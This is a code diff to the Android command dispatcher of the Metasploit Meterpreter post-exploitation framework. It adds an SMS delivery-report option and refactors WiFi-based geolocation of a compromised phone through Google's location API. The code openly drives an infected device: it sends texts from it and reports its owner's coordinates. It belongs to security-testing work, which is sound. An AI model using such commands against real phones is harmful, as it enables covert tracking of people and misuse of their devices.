@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 require 'rex/post/meterpreter'
 require 'msf/core/auxiliary/report'
+require 'rex/google_geolocation'
 
 module Rex
 module Post
@@ -377,10 +378,12 @@ class Console::CommandDispatcher::Android
     send_sms_opts = Rex::Parser::Arguments.new(
       '-h' => [ false, 'Help Banner' ],
       '-d' => [ true, 'Destination number' ],
-      '-t' => [ true, 'SMS body text' ]
+      '-t' => [ true, 'SMS body text' ],
+      '-dr' => [ false, 'Wait for delivery report' ]
     )
     dest=''
     body=''
+    dr=false
     send_sms_opts.parse(args) { | opt, idx, val |
       case opt
       when '-h'
@@ -392,6 +395,8 @@ class Console::CommandDispatcher::Android
 	dest=val
       when '-t'
 	body=val
+      when '-dr'
+	dr=true
       end
     }
     if (dest.blank? or body.blank?)
@@ -400,11 +405,25 @@ class Console::CommandDispatcher::Android
         print_line(send_sms_opts.usage)
 	return
     end
-    sent=client.android.send_sms(dest,body)
-    if (sent)
-        print_good('SMS sent')
+
+    sent=client.android.send_sms(dest,body,dr)
+    if (dr)
+      if (sent[0]=="Transmission successful")
+          print_good("SMS sent - #{sent[0]}")
+      else
+          print_error("SMS send failed - #{sent[0]}")
+      end
+      if (sent[1]=="Transmission successful")
+          print_good("SMS delivered - #{sent[1]}")
+      else
+          print_error("SMS delivery failed - #{sent[1]}")
+      end
     else
-        print_status('SMS failed to send')
+      if (sent=="Transmission successful")
+          print_good("SMS sent - #{sent}")
+      else
+          print_error("SMS send failed - #{sent}")
+      end
     end
   end
 
@@ -422,42 +441,36 @@ class Console::CommandDispatcher::Android
         print_line(wlan_geolocate_opts.usage)
         return
       end
-    
-    print_status('Waiting for WiFi scan results...')
+    }
+
     log = client.android.wlan_geolocate
-    wlan_list=''
+    wlan_list=[]
+    wlan_str=""
     log.each{|x|
 	mac=x['bssid']
 	ssid=x['ssid']
 	ss=x['level']
-	network_data = "&wifi=mac:#{mac}|ssid:#{ssid}|ss=#{ss}"
-	wlan_list << network_data
+	wlan_list << [mac,ssid,ss.to_s]
     }
 
     if wlan_list.blank?
       print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
       return
     end
+    g = Rex::GoogleGeolocation.new
 
-    # Build and send the request to Google
-    url = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true#{wlan_list}"
-    uri = URI.parse(URI.encode(url))
-    request = Net::HTTP::Get.new(uri.request_uri)
-    http = Net::HTTP::new(uri.host,uri.port)
-    http.use_ssl = true
-    response = http.request(request)
-
-    # Gather the required information from the response
-    if response && response.code == '200'
-      results = JSON.parse(response.body)
-      latitude =  results["location"]["lat"]
-      longitude = results["location"]["lng"]
-      accuracy = results["accuracy"]
-      print_status("Google indicates that the target is within #{accuracy} meters of #{latitude},#{longitude}.")
-      print_status("Google Maps URL:  https://maps.google.com/?q=#{latitude},#{longitude}")
-    else
-      print_error("Failure connecting to Google for location lookup.")
+    wlan_list.each do |wlan|
+      g.add_wlan(*wlan)
     end
+    begin
+      g.fetch!
+    rescue RuntimeError => e
+      print_error("Error: #{e}")
+    else
+      print_status(g.to_s)
+      print_status("Google Maps URL:  #{g.google_maps_url}")
+    end
+
 
   end
 
